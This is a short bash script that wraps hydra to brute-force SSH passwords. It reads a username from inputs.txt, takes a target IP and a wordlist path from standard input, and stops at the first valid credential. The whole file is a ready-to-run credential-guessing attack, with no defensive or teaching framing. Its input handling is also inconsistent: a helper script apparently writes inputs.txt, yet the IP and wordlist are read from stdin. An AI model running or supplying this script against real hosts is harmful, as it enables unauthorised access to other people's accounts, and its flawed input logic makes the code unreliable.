#!/bin/bash

# Run the Python script to get inputs
python3 get_input.py

# Read the inputs from the file
read -r username < inputs.txt
read -r ip <&0
read -r wordlist <&0

# Run the hydra command
hydra -l "$username" -P "$wordlist" ssh://"$ip" -V -I -F

